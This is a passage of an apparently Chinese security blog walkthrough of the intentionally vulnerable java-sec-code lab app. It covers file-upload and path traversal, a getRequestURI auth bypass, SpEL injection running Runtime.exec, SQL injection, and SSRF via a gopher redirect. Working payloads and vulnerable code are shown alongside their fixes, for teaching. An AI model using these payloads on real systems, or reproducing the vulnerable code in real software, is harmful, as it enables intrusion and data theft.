   &#x2F;&#x2F; Get the file and save it somewhere</span><br><span class="line">            byte[] bytes &#x3D; multifile.getBytes();</span><br><span class="line">            Path path &#x3D; Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);</span><br><span class="line">        logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);</span><br><span class="line">        return String.format(&quot;You successfully uploaded &#39;%s&#39;&quot;, filePath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void deleteFile(String filePath) &#123;</span><br><span class="line">        File delFile &#x3D; new File(filePath);</span><br><span class="line">        if(delFile.isFile() &amp;&amp; delFile.exists()) &#123;</span><br><span class="line">            if (delFile.delete()) &#123;</span><br><span class="line">                logger.info(&quot;[+] &quot; + filePath + &quot; delete successfully!&quot;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        logger.info(filePath + &quot; delete failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.对文件名做了白名单限制{“.jpg”, “.png”, “.jpeg”, “.gif”, “bmp”, “.ico”} 只允许对这些文件进行上传</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String[] picSuffixList &#x3D; &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;</span><br><span class="line">boolean suffixFlag &#x3D; false;</span><br><span class="line">for (String white_suffix : picSuffixList) &#123;</span><br><span class="line">    if (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line">        suffixFlag &#x3D; true;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!suffixFlag) &#123;</span><br><span class="line">    logger.error(&quot;[-] Suffix error: &quot; + Suffix);</span><br><span class="line">    deleteFile(filePath);</span><br><span class="line">    return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.判断MIME类型是否在黑名单内 </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;text&#x2F;html&quot;,</span><br><span class="line">&quot;text&#x2F;javascript&quot;,</span><br><span class="line">&quot;application&#x2F;javascript&quot;,</span><br><span class="line">&quot;application&#x2F;ecmascript&quot;,</span><br><span class="line">&quot;text&#x2F;xml&quot;,</span><br><span class="line">&quot;application&#x2F;xml&quot;</span><br></pre></td></tr></table></figure><p>3.使用contains为了防止text/html;charset=UTF-8绕过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line">    logger.error(&quot;[-] Mime type error: &quot; + mimeType);</span><br><span class="line">    deleteFile(filePath);</span><br><span class="line">    return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.使用IsImage()函数调用ImageIO.read()函数来检测内容是否为文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static boolean isImage(File file) throws IOException &#123;</span><br><span class="line">    BufferedImage bi &#x3D; ImageIO.read(file);</span><br><span class="line">    return bi !&#x3D; null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.上传文件时会通过uuid生成一个’/tmp’ + uuid + ‘png’ 这样的文件名，然后最后删除掉</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F; Get the file and save it somewhere</span><br><span class="line">        byte[] bytes &#x3D; multifile.getBytes();</span><br><span class="line">        Path path &#x3D; Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        deleteFile(filePath);</span><br><span class="line">        return &quot;Upload failed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);</span><br><span class="line">    logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);</span><br><span class="line">    return String.format(&quot;You successfully uploaded &#39;%s&#39;&quot;, filePath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private void deleteFile(String filePath) &#123;</span><br><span class="line">    File delFile &#x3D; new File(filePath);</span><br><span class="line">    if(delFile.isFile() &amp;&amp; delFile.exists()) &#123;</span><br><span class="line">        if (delFile.delete()) &#123;</span><br><span class="line">            logger.info(&quot;[+] &quot; + filePath + &quot; delete successfully!&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    logger.info(filePath + &quot; delete failed!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026084805243.png" alt="image-20211026084805243"></p><p>存在未对文件名做校验，存在路径穿越漏洞，参数修改为<code>../../Users/oldthree/Documents/0.OL4THREE/0.Base/apache-tomcat-8.5.70/webapps/java_sec_code_war/1.png</code> 我们可以上传图片到任意目录，上传图片马不解析</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026084911718.png" alt="image-20211026084911718"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">─ol4three ~&#x2F;Documents&#x2F;0.OL4THREE&#x2F;0.Base&#x2F;apache-tomcat-8.5.70&#x2F;webapps&#x2F;java_sec_code_war</span><br><span class="line">╰─$ ls</span><br><span class="line">1.png    META-INF WEB-INF</span><br></pre></td></tr></table></figure><p>直接进行访问即可</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026085048387.png" alt="image-20211026085048387"></p><p>由于会重新随机生成文件名未在检测中进行，导致上传jsp失败仍然会在/tmp目录下进行生成随机数生成的.jsp</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026092407832.png" alt="image-20211026092407832"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╭─ol4three &#x2F;tmp</span><br><span class="line">╰─$ ls</span><br><span class="line">06dc320d-35fb-11ec-937b-c91feee9eae9.jsp</span><br><span class="line">1989897e-35fb-11ec-937b-195f26ab9cc0.jsp</span><br><span class="line">2156c28f-35fb-11ec-937b-a71889553c3e.jsp</span><br></pre></td></tr></table></figure><p>使用文件上传any接口上传jsp文件解析利用如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026091923728.png" alt="image-20211026091923728"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026091850244.png" alt="image-20211026091850244"></p><h2 id="10-GetRequestURI"><a href="#10-GetRequestURI" class="headerlink" title="10.GetRequestURI"></a>10.GetRequestURI</h2><blockquote><p>当应用存在静态资源目录，比如<code>/css/</code>目录，在权限校验时一般会选择放行，即不校验权限。研发同学用<code>getRequestURI()</code>获取URI后，判断是否包含 <code>/css/</code>字符串，如果包含则不校验权限。此时如果URI为<code>/css/../hello</code>，用<code>getRequestURI()</code>获取的URI是<code>/css/../hello</code>，包含<code>/css/</code>字符串，所以不校验权限。但是此时后端的路由为<code>/hello</code>，导致权限绕过。</p></blockquote><p>核心代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(value &#x3D; &quot;&#x2F;exclued&#x2F;vuln&quot;)</span><br><span class="line">public String exclued(HttpServletRequest request) &#123;</span><br><span class="line"></span><br><span class="line">    String[] excluedPath &#x3D; &#123;&quot;&#x2F;css&#x2F;**&quot;, &quot;&#x2F;js&#x2F;**&quot;&#125;;</span><br><span class="line">    String uri &#x3D; request.getRequestURI(); &#x2F;&#x2F; Security: request.getServletPath()</span><br><span class="line">    PathMatcher matcher &#x3D; new AntPathMatcher();</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;getRequestURI: &quot; + uri);</span><br><span class="line">    logger.info(&quot;getServletPath: &quot; + request.getServletPath());</span><br><span class="line"></span><br><span class="line">    for (String path : excluedPath) &#123;</span><br><span class="line">        if (matcher.match(path, uri)) &#123;</span><br><span class="line">            return &quot;You have bypassed the login page.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;This is a login page &gt;..&lt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到判断包含/css/和/js/字符串如果包含则不进行校验权限</p><p>由于作者写的时候是使用根目录检测需要/css/..;/exclued/vuln 开头，可以修改网站根目录进行测试或者，手动调试修改代码</p><p>使用curl进行验证发现可以成功绕过return “You have bypasswd the login page.” </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ curl -i -s -k  -X $&#39;GET&#39; \</span><br><span class="line">    -H $&#39;Upgrade-Insecure-Requests: 1&#39; -H $&#39;User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36&#39; -H $&#39;Referer: http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;login&#39; \</span><br><span class="line">    -b $&#39;JSESSIONID&#x3D;41B2022F0376956FF0E5583CEC92FD3B; XSRF-TOKEN&#x3D;7de740ac-305e-41b3-b711-438a1b068f77; remember-me&#x3D;YWRtaW46MTYzNjM2NzI0NjU0NDozNTYwZjNiODFiODBhOTYxOTcxZGM4YWQ2NDY5ZTExZA&#39; \</span><br><span class="line">    $&#39;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;uri&#x2F;css&#x2F;..;&#x2F;exclued&#x2F;vuln&#39;</span><br><span class="line">HTTP&#x2F;1.1 200</span><br><span class="line">X-Application-Context: application</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-XSS-Protection: 1; mode&#x3D;block</span><br><span class="line">Cache-Control: no-cache, no-store, max-age&#x3D;0, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Expires: 0</span><br><span class="line">X-Frame-Options: DENY</span><br><span class="line">Content-Type: text&#x2F;plain;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 33</span><br><span class="line"></span><br><span class="line">You have bypassed the login page.%</span><br></pre></td></tr></table></figure><p>使用浏览器访问如下：<a href="http://172.20.10.6:8080/java_sec_code_war/uri/css/..;/exclued/vuln">http://172.20.10.6:8080/java_sec_code_war/uri/css/..;/exclued/vuln</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211025182934819.png" alt="image-20211025182934819"></p><p>安全的方法是使用：getServletPath()方法，该方法会自动对URL</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2021-10-25 18:28:11.268  INFO 2967 --- [nio-8080-exec-5] org.joychou.controller.GetRequestURI     : getRequestURI: &#x2F;css&#x2F;..;&#x2F;exclued&#x2F;vuln</span><br><span class="line">2021-10-25 18:28:11.268  INFO 2967 --- [nio-8080-exec-5] org.joychou.controller.GetRequestURI     : getServletPath: &#x2F;exclued&#x2F;vuln</span><br></pre></td></tr></table></figure><p>使用getServletPath()方法对URI进行标准化(normalize)，先对URI进行URLDecode，如果存在<code>/../</code>，将其返回到上一级目录，即/css/..;/exclued/vuln/处理为/exclued/vuln/，并将新的Path设置为servletPath。</p><h2 id="11-PathTraversal"><a href="#11-PathTraversal" class="headerlink" title="11.PathTraversal"></a>11.PathTraversal</h2><p>路径遍历攻击（也称为目录遍历）是指在访问储存在web根目录文件夹之外的文件和目录。通过操纵带有“点-斜线（..）”序列及其变化的文件或使用绝对文件路径来引用文件的变量，可以访问存储在文件系统上的任意文件和目录，包括应用程序源代码、配置和关键系统文件。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;path_traversal&#x2F;vul?filepath&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;path_traversal&#x2F;vul&quot;)</span><br><span class="line">public String getImage(String filepath) throws IOException &#123;</span><br><span class="line">    return getImgBase64(filepath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    private String getImgBase64(String imgFile) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));</span><br><span class="line">    logger.info(&quot;File path: &quot; + imgFile);</span><br><span class="line"></span><br><span class="line">    File f &#x3D; new File(imgFile);</span><br><span class="line">    if (f.exists() &amp;&amp; !f.isDirectory()) &#123;</span><br><span class="line">        byte[] data &#x3D; Files.readAllBytes(Paths.get(imgFile));</span><br><span class="line">        return new String(Base64.encodeBase64(data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &quot;File doesn&#39;t exist or is not a file.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有对文件名做校验存在漏洞</p><p>访问<a href="http://172.20.10.6:8080/java_sec_code_war/path_traversal/vul?filepath=../../../../../../../../etc/passwd">http://172.20.10.6:8080/java_sec_code_war/path_traversal/vul?filepath=../../../../../../../../etc/passwd</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026094047542.png" alt="image-20211026094047542"></p><p>修复代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;path_traversal&#x2F;sec&quot;)</span><br><span class="line">public String getImageSec(String filepath) throws IOException &#123;</span><br><span class="line">    if (SecurityUtil.pathFilter(filepath) &#x3D;&#x3D; null) &#123;</span><br><span class="line">        logger.info(&quot;Illegal file path: &quot; + filepath);</span><br><span class="line">        return &quot;Bad boy. Illegal file path.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return getImgBase64(filepath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用pathFilter对输入的路径进行过滤，跟进去查看pathFilter()函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String pathFilter(String filepath) &#123;</span><br><span class="line">    String temp &#x3D; filepath;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; use while to sovle multi urlencode</span><br><span class="line">    while (temp.indexOf(&#39;%&#39;) !&#x3D; -1) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            temp &#x3D; URLDecoder.decode(temp, &quot;utf-8&quot;);</span><br><span class="line">        &#125; catch (UnsupportedEncodingException e) &#123;</span><br><span class="line">            logger.info(&quot;Unsupported encoding exception: &quot; + filepath);</span><br><span class="line">            return null;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.info(e.toString());</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (temp.contains(&quot;..&quot;) || temp.charAt(0) &#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return filepath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对输入的参数先做检测若是URL编码先做解码，然后检测对”..”,”/“参数做过滤。</p><h2 id="12-SpEL"><a href="#12-SpEL" class="headerlink" title="12.SpEL"></a>12.SpEL</h2><blockquote><p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。</p></blockquote><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;spel&#x2F;vuln&quot;)</span><br><span class="line">public String rce(String expression) &#123;</span><br><span class="line">    ExpressionParser parser &#x3D; new SpelExpressionParser();</span><br><span class="line">    &#x2F;&#x2F; fix method: SimpleEvaluationContext</span><br><span class="line">    return parser.parseExpression(expression).getValue().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接将用户的输入当作表达式内容进行解析。</p><p>输入一个简单的乘法运算<code>2*2</code>，可以看到返回的值是经过解析后的<code>4</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026095240922.png" alt="image-20211026095240922"></p><p>执行下系统命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;spel&#x2F;vuln&#x2F;?expression&#x3D;T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026095448592.png" alt="image-20211026095448592"></p><ol><li><a href="https://www.kingkk.com/2019/05/SPEL表达式注入-入门篇/">SPEL表达式注入-入门篇</a></li><li><a href="http://rui0.cn/archives/1043">由浅入深SpEL表达式注入漏洞</a></li></ol><h2 id="13-SQLI"><a href="#13-SQLI" class="headerlink" title="13.SQLI"></a>13.SQLI</h2><p>Sql注入修改mysql的配置之后即可进行，整体比较简单</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;jdbc&#x2F;vuln&quot;)</span><br><span class="line">public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder result &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        Connection con &#x3D; DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        if (!con.isClosed())</span><br><span class="line">            System.out.println(&quot;Connect to database successfully.&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; sqli vuln code</span><br><span class="line">        Statement statement &#x3D; con.createStatement();</span><br><span class="line">        String sql &#x3D; &quot;select * from users where username &#x3D; &#39;&quot; + username + &quot;&#39;&quot;;</span><br><span class="line">        logger.info(sql);</span><br><span class="line">        ResultSet rs &#x3D; statement.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        while (rs.next()) &#123;</span><br><span class="line">            String res_name &#x3D; rs.getString(&quot;username&quot;);</span><br><span class="line">            String res_pwd &#x3D; rs.getString(&quot;password&quot;);</span><br><span class="line">            String info &#x3D; String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(&quot;Sorry,can&#96;t find the Driver!&quot;);</span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    return result.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接对输入的username参数进行拼接存在sql注入漏洞</p><p>访问url：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;sqli&#x2F;mybatis&#x2F;vuln01?username&#x3D;joychou%27%20or%20%271%27&#x3D;%271</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026181809439.png" alt="image-20211026181809439"></p><p>控制台输出如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01    : &#x3D;&#x3D;&gt;  Preparing: select * from users where username &#x3D; &#39;joychou&#39; or &#39;1&#39;&#x3D;&#39;1&#39; </span><br><span class="line">DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01    : &#x3D;&#x3D;&gt; Parameters: </span><br><span class="line">DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01    : &lt;&#x3D;&#x3D;      Total: 2</span><br></pre></td></tr></table></figure><p>修复代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;jdbc&#x2F;sec&quot;)</span><br><span class="line">public String jdbc_sqli_sec(@RequestParam(&quot;username&quot;) String username) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder result &#x3D; new StringBuilder();</span><br><span class="line">    try &#123;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        Connection con &#x3D; DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        if (!con.isClosed())</span><br><span class="line">            System.out.println(&quot;Connecting to Database successfully.&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; fix code</span><br><span class="line">        String sql &#x3D; &quot;select * from users where username &#x3D; ?&quot;;</span><br><span class="line">        PreparedStatement st &#x3D; con.prepareStatement(sql);</span><br><span class="line">        st.setString(1, username);</span><br><span class="line"></span><br><span class="line">        logger.info(st.toString());  &#x2F;&#x2F; sql after prepare statement</span><br><span class="line">        ResultSet rs &#x3D; st.executeQuery();</span><br><span class="line"></span><br><span class="line">        while (rs.next()) &#123;</span><br><span class="line">            String res_name &#x3D; rs.getString(&quot;username&quot;);</span><br><span class="line">            String res_pwd &#x3D; rs.getString(&quot;password&quot;);</span><br><span class="line">            String info &#x3D; String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line">    &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(&quot;Sorry, can&#96;t find the Driver!&quot;);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    return result.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>prepareStatement()通过预处理方式进行修复</p><blockquote><p>预处理的修复原理：针对字符串类型的SQL注入，是在字符串两边加上一对单号哈<code>&#39;&#39;</code>，对于中间点的单引号对其进行转义<code>\&#39;</code>，让其变成字符的单引号。Mybatis的<code>#&#123;&#125;</code>也是预处理方式处理SQL注入。</p><p>在使用了mybatis框架后，需要进行排序功能时，在mapper.xml文件中编写SQL语句时，注意orderBy后的变量要使用<code>$&#123;&#125;</code>,而不用<code>#&#123;&#125;</code>。因为<code>#&#123;&#125;</code>变量是经过预编译的，<code>$&#123;&#125;</code>没有经过预编译。虽然<code>$&#123;&#125;</code>存在SQL注入的风险，但orderBy必须使用<code>$&#123;&#125;</code>，因为<code>#&#123;&#125;</code>会多出单引号<code>&#39;&#39;</code>导致SQL语句失效。为防止SQL注入只能自己对其过滤。</p></blockquote><p>根据下面的结果可以发现<code>order by &#39;username&#39;</code>并没有用，第一条SQL和第二条SQL效果一样。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users order by &#39;username&#39; desc -- 结果为 joychou wilson lightless </span><br><span class="line">select * from users                      -- 结果为 joychou wilson lightless </span><br><span class="line">select * from users order by username        -- 结果为 joychou lightless wilson</span><br><span class="line">select * from users order by username desc   -- 结果为 wilson lightless joychou</span><br></pre></td></tr></table></figure><h2 id="14-SSRF"><a href="#14-SSRF" class="headerlink" title="14.SSRF"></a>14.SSRF</h2><h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><blockquote><p>SSRF(Server-side Request Forge, 服务端请求伪造)。 由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p></blockquote><h3 id="2-支持协议"><a href="#2-支持协议" class="headerlink" title="2.支持协议"></a>2.支持协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file ftp mailto http https jar netdoc</span><br></pre></td></tr></table></figure><p>如果发起网络请求的类是带HTTP开头，那只支持HTTP、HTTPS协议。</p><h3 id="3-重定向"><a href="#3-重定向" class="headerlink" title="3.重定向"></a>3.重定向</h3><p>Java默认会跟随重定向。先在一台服务器上写一个test.php，代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url &#x3D; &#39;gopher:&#x2F;&#x2F;35.185.163.134:2333&#x2F;_joy%0achou&#39;;</span><br><span class="line">header(&quot;location: $url&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>启动apache 放置对应文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apachectl start</span><br><span class="line">cp ~&#x2F;Desktop&#x2F;test.php &#x2F;Library&#x2F;WebServer&#x2F;Documents</span><br></pre></td></tr></table></figure><p>访问payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln?url&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php</span><br></pre></td></tr></table></figure><p>收到异常：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.net.MalformedURLException: unknown protocol: gopher</span><br></pre></td></tr></table></figure><p>跟踪报错代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private boolean followRedirect() throws IOException &#123;</span><br><span class="line">    if(!this.getInstanceFollowRedirects()) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        final int var1 &#x3D; this.getResponseCode();</span><br><span class="line">        if(var1 &gt;&#x3D; 300 &amp;&amp; var1 &lt;&#x3D; 307 &amp;&amp; var1 !&#x3D; 306 &amp;&amp; var1 !&#x3D; 304) &#123;</span><br><span class="line">            final String var2 &#x3D; this.getHeaderField(&quot;Location&quot;);</span><br><span class="line">            if(var2 &#x3D;&#x3D; null) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                URL var3;</span><br><span class="line">                try &#123;</span><br><span class="line">                    &#x2F;&#x2F; 该行代码发生异常，var2变量值为&#96;gopher:&#x2F;&#x2F;35.185.163.134:2333&#x2F;_joy%0achou&#96;</span><br><span class="line">                    var3 &#x3D; new URL(var2);</span><br><span class="line">                    &#x2F;* 该行代码，表示传入的协议必须和重定向的协议一致</span><br><span class="line">                     * 即http:&#x2F;&#x2F;joychou.me&#x2F;302.php的协议必须和gopher:&#x2F;&#x2F;35.185.163.134:2333&#x2F;_joy%0achou一致</span><br><span class="line">                     *&#x2F;</span><br><span class="line">                    if(!this.url.getProtocol().equalsIgnoreCase(var3.getProtocol())) &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (MalformedURLException var8) &#123;</span><br><span class="line">                    var3 &#x3D; new URL(this.url, var2);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>从上面的followRedirect方法可以看到：</p><ul><li>实际跳转的URL也在限制的协议内</li><li>传入的URL协议必须和重定向后的URL协议一致。如果不一致，相当于没有进行重定向，返回空页面。</li></ul><p>所以，Java的SSRF利用方式比较局限：</p><ul><li>利用file协议任意文件读取</li><li>利用http协议探测端口或攻击内网服务</li></ul><h3 id="4-DNS-Rebinding"><a href="#4-DNS-Rebinding" class="headerlink" title="4.DNS Rebinding"></a>4.DNS Rebinding</h3><p>先了解下Java应用的TTL机制。Java应用的默认TTL为10s，这个默认配置会导致DNS Rebinding绕过失败。也就是说，默认情况下，Java应用不受DNS Rebinding影响。</p><p>Java TTL的值可以通过下面三种方式进行修改：</p><ol><li><p>JVM添加启动参数<code>-Dsun.net.inetaddr.ttl=0</code></p></li><li><p>通过代码进行修改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.security.Security.setProperty(&quot;networkaddress.cache.negative.ttl&quot; , &quot;0&quot;);</span><br></pre></td></tr></table></figure></li><li><p>修改<code>java.security</code>里的<code>networkaddress.cache.negative.ttl</code>变量为0</p></li></ol><h3 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h3><ul><li>Java默认跟随重定向；</li><li>Java默认TTL为10；</li><li>是否受DNS Rebinding影响取决于缓存；</li><li>如果发起网络请求的类是带HTTP开头，那只支持HTTP、HTTPS协议。</li><li>传入的URL协议必须和重定向后的URL协议一致。如果不一致，相当于没有进行重定向，返回空页面。</li></ul><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;urlConnection&#x2F;vuln&quot;, method &#x3D; &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span><br><span class="line">public String URLConnectionVuln(String url) &#123;</span><br><span class="line">    return HttpUtils.URLConnection(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进URLConnectiong(url)</p><figure 